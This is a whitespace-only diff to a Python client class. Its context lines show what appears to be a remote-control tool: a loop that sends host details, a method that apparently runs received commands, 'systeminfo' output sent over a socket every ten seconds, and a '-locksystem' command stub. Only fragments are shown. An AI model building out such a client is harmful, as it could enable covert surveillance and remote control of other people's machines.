@@ -47,6 +47,7 @@ class Client:
         while True:
             input("Success - Reached the code loop")
             self.sendHostInfo()
+
     def runrun(self, msg):
         obj = "failed"
         try:
@@ -54,7 +55,6 @@ class Client:
             # output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")
         except Exception as e:
             print("This failed too (runrun) : " + str(e) + " + " + str(obj))
-
 
     def sendHostInfo(self):
         """ Extracting host information """
@@ -97,7 +97,6 @@ class Client:
         input()
         self.sysinfViaCMDFile()
 
-
     def sysinfViaCMDFile(self):
         # traverse the info
         Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
@@ -119,7 +118,6 @@ class Client:
             time.sleep(10)
             self.client.send(c)
 
-
     def sysinfViaCMD(self):
         # traverse the info
         Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
@@ -130,8 +128,6 @@ class Client:
             new.append(str(item.split("\r")[:-1]))
         for i in new:
             print(i[2:-2])
-
-
 
     def locksystem(self):
         ## command = "-locksystem"
